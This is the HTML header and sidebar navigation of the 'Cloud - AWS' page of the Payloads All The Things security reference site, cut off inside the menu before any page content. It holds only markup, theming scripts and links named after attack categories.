
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
      
        <link rel="prev" href="../Bind%20Shell%20Cheatsheet/">
      
      
        <link rel="next" href="../Cloud%20-%20Azure%20Pentest/">
      
      <link rel="icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.4.2, mkdocs-material-9.1.1">
    
    
      
        <title>Cloud - AWS - Payloads All The Things</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.402914a4.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.a0c5b2b5.min.css">
      
      

    
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="" data-md-color-accent="">
  
    
    
      <script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var key of Object.keys(palette.color))document.body.setAttribute("data-md-color-"+key,palette.color[key])</script>
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#cloud-aws" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../.." title="Payloads All The Things" class="md-header__button md-logo" aria-label="Payloads All The Things" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Payloads All The Things
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Cloud - AWS
            
          </span>
        </div>
      </div>
    </div>
    
      <form class="md-header__option" data-md-component="palette">
        
          
          <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="" data-md-color-accent=""  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
          
            <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
            </label>
          
        
          
          <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="" data-md-color-accent=""  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_2">
          
            <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12c0-2.42-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
            </label>
          
        
      </form>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
      <div class="md-header__source">
        <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.3.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
  </div>
  <div class="md-source__repository">
    GitHub
  </div>
</a>
      </div>
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


  

<nav class="md-nav md-nav--primary md-nav--integrated" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="Payloads All The Things" class="md-nav__button md-logo" aria-label="Payloads All The Things" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    Payloads All The Things
  </label>
  
    <div class="md-nav__source">
      <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.3.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
  </div>
  <div class="md-source__repository">
    GitHub
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        Payloads All The Things
      </a>
    </li>
  

    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../../CONTRIBUTING/" class="md-nav__link">
        CONTRIBUTING
      </a>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
      
      
      
        <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
          API Key Leaks
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_3">
          <span class="md-nav__icon md-icon"></span>
          API Key Leaks
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../API%20Key%20Leaks/" class="md-nav__link">
        API Key Leaks
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
      
      
      
        <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
          AWS Amazon Bucket S3
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_4">
          <span class="md-nav__icon md-icon"></span>
          AWS Amazon Bucket S3
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../AWS%20Amazon%20Bucket%20S3/" class="md-nav__link">
        Amazon Bucket S3 AWS
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
      
      
      
        <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
          Account Takeover
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_5">
          <span class="md-nav__icon md-icon"></span>
          Account Takeover
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Account%20Takeover/" class="md-nav__link">
        Account Takeover
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
      
      
      
        <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
          Argument Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_6">
          <span class="md-nav__icon md-icon"></span>
          Argument Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Argument%20Injection/" class="md-nav__link">
        Argument Injection
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
      
      
      
        <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
          CORS Misconfiguration
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_7">
          <span class="md-nav__icon md-icon"></span>
          CORS Misconfiguration
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../CORS%20Misconfiguration/" class="md-nav__link">
        CORS Misconfiguration
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
      
      
      
        <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
          CRLF Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_8">
          <span class="md-nav__icon md-icon"></span>
          CRLF Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../CRLF%20Injection/" class="md-nav__link">
        Carriage Return Line Feed
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9" >
      
      
      
        <label class="md-nav__link" for="__nav_9" id="__nav_9_label" tabindex="0">
          CSRF Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_9">
          <span class="md-nav__icon md-icon"></span>
          CSRF Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../CSRF%20Injection/" class="md-nav__link">
        Cross-Site Request Forgery
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_10" >
      
      
      
        <label class="md-nav__link" for="__nav_10" id="__nav_10_label" tabindex="0">
          CSV Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_10_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_10">
          <span class="md-nav__icon md-icon"></span>
          CSV Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../CSV%20Injection/" class="md-nav__link">
        CSV Injection
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11" >
      
      
      
        <label class="md-nav__link" for="__nav_11" id="__nav_11_label" tabindex="0">
          CVE Exploits
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_11_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_11">
          <span class="md-nav__icon md-icon"></span>
          CVE Exploits
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../CVE%20Exploits/" class="md-nav__link">
        Common Vulnerabilities and Exposures
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../CVE%20Exploits/Log4Shell/" class="md-nav__link">
        CVE-2021-44228 Log4Shell
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_12" >
      
      
      
        <label class="md-nav__link" for="__nav_12" id="__nav_12_label" tabindex="0">
          Command Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_12_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_12">
          <span class="md-nav__icon md-icon"></span>
          Command Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Command%20Injection/" class="md-nav__link">
        Command Injection
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_13" >
      
      
      
        <label class="md-nav__link" for="__nav_13" id="__nav_13_label" tabindex="0">
          DNS Rebinding
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_13_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_13">
          <span class="md-nav__icon md-icon"></span>
          DNS Rebinding
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../DNS%20Rebinding/" class="md-nav__link">
        DNS Rebinding
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_14" >
      
      
      
        <label class="md-nav__link" for="__nav_14" id="__nav_14_label" tabindex="0">
          Dependency Confusion
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_14_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_14">
          <span class="md-nav__icon md-icon"></span>
          Dependency Confusion
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Dependency%20Confusion/" class="md-nav__link">
        Dependency Confusion
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_15" >
      
      
      
        <label class="md-nav__link" for="__nav_15" id="__nav_15_label" tabindex="0">
          Directory Traversal
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_15_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_15">
          <span class="md-nav__icon md-icon"></span>
          Directory Traversal
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Directory%20Traversal/" class="md-nav__link">
        Directory Traversal
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_16" >
      
      
      
        <label class="md-nav__link" for="__nav_16" id="__nav_16_label" tabindex="0">
          File Inclusion
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_16_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_16">
          <span class="md-nav__icon md-icon"></span>
          File Inclusion
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../File%20Inclusion/" class="md-nav__link">
        File Inclusion
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_17" >
      
      
      
        <label class="md-nav__link" for="__nav_17" id="__nav_17_label" tabindex="0">
          GraphQL Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_17_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_17">
          <span class="md-nav__icon md-icon"></span>
          GraphQL Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../GraphQL%20Injection/" class="md-nav__link">
        GraphQL Injection
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_18" >
      
      
      
        <label class="md-nav__link" for="__nav_18" id="__nav_18_label" tabindex="0">
          HTTP Parameter Pollution
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_18_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_18">
          <span class="md-nav__icon md-icon"></span>
          HTTP Parameter Pollution
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../HTTP%20Parameter%20Pollution/" class="md-nav__link">
        HTTP Parameter Pollution
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_19" >
      
      
      
        <label class="md-nav__link" for="__nav_19" id="__nav_19_label" tabindex="0">
          Insecure Deserialization
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_19_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_19">
          <span class="md-nav__icon md-icon"></span>
          Insecure Deserialization
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Insecure%20Deserialization/" class="md-nav__link">
        Insecure Deserialization
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Insecure%20Deserialization/DotNET/" class="md-nav__link">
        .NET Serialization
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Insecure%20Deserialization/Java/" class="md-nav__link">
        Java Deserialization
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Insecure%20Deserialization/Node/" class="md-nav__link">
        Node Deserialization
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Insecure%20Deserialization/PHP/" class="md-nav__link">
        PHP Deserialization
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Insecure%20Deserialization/Python/" class="md-nav__link">
        Python Deserialization
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Insecure%20Deserialization/Ruby/" class="md-nav__link">
        Ruby Deserialization
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Insecure%20Deserialization/YAML/" class="md-nav__link">
        YAML Deserialization
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_20" >
      
      
      
        <label class="md-nav__link" for="__nav_20" id="__nav_20_label" tabindex="0">
          Insecure Direct Object References
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_20_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_20">
          <span class="md-nav__icon md-icon"></span>
          Insecure Direct Object References
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Insecure%20Direct%20Object%20References/" class="md-nav__link">
        Insecure Direct Object References
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_21" >
      
      
      
